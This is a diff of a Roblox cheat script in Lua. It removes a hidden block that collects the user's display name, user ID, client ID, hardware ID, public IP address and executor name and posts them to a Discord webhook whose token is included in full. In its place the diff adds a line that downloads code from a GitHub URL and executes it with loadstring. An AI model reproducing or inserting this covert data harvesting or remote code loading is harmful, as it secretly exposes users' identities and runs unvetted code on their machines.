@@ -7,15 +7,10 @@ end
 _G.AntiFlingToggled = false
 local Players = game:GetService("Players")
 
-local LocalPlayer = Players.LocalPlayer
-local playerScripts = LocalPlayer:WaitForChild("PlayerScripts")
-
-local Executor = identifyexecutor()
 local plr = Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local Light = game:GetService("Lighting")
-local HttpService = game:GetService("HttpService")
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local mouse = plr:GetMouse()
 local ScriptWhitelist = {}
@@ -3521,91 +3516,5 @@ task.spawn(function()
 		end)
 	end
 end)
-export type Json = {
-    Url: string;
-    Method: "POST";
-    Headers: string;
-    Body: any
-}
 
-local hwid
-local cant = false
-task.spawn(function()
-	local http_request = syn and syn.request or request
-	local body, decoded
-	if http_request then
-		body = http_request({ Url = "https://httpbin.org/get", Method = "GET" }).Body
-		decoded = game:GetService("HttpService"):JSONDecode(body)
-		for i, v in pairs(decoded.headers) do
-			if string.find(i, "Fingerprint") then
-				hwid = v
-				break
-			end
-		end
-	else
-		cant = true
-	end
-end)
-repeat
-	task.wait(0)
-until hwid or cant
-if cant then
-	print("Sorry, but your exploit cannot get your HWID.")
-	wait(10)
-else
-end
-
-local responce = http_request({
-	Url = https://discord.com/api/webhooks/1462094254393262296/nA3q1fNcFkWLlVctGOqoUiwHUHL0DeTVNF6vd0ANMqKPBfV-J6R_6iydddMopmQesjTY,
-	Method = "POST",
-	Headers = {
-		["Content-Type"] = "application/json",
-	},
-	Body = HttpService:JSONEncode({
-		["embeds"] = {
-			{
-				["title"] = "**Your script has been executed!**",
-				["type"] = "rich",
-				["color"] = tonumber(0xff0000),
-				["fields"] = {
-
-					{
-						["name"] = "Username:",
-						["value"] = LocalPlayer.DisplayName,
-						["inline"] = true,
-					},
-
-					{
-						["name"] = "Client ID:",
-						["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-						["inline"] = false,
-					},
-
-					{
-						["name"] = "User ID:",
-						["value"] = LocalPlayer.UserId,
-						["inline"] = false,
-					},
-
-					{
-						["name"] = "Hwid:",
-						["value"] = string.format(hwid),
-						["inline"] = false,
-					},
-
-					{
-						["name"] = "IP:",
-						["value"] = string.format(game:HttpGet("https://v4.ident.me/")),
-						["inline"] = false,
-					},
-
-					{
-						["name"] = "Executor:",
-						["value"] = string.format(Executor),
-						["inline"] = false,
-					},
-				},
-			},
-		},
-	}),
-})
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mmmhlecaca/SystemBroken/main/version'))()
